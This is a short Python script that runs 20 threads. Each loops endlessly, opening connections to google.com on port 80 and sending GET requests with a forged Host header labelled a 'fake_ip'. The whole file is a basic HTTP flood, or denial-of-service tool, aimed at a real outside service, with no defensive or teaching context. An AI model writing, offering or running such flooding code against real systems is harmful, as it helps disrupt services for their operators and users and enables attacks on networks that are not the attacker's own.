from socket import socket, AF_INET, SOCK_STREAM
from threading import Thread

target = "google.com"
port = 80
fake_ip = "182.64.65.10"

connected = 0

def worker():
    while True:
        s = socket(AF_INET, SOCK_STREAM)
        s.connect((target, port))
        s.sendto((f"GET /{target} HTTP/1.1\r\n".encode("ascii")), (target, port))
        s.sendto((f"Host: {fake_ip} \r\n\r\n".encode("ascii")), (target, port))
        s.close()

        global connected
        connected += 1
        print(connected)

for i in range(20):
    thread = Thread(target=worker)
    thread.start()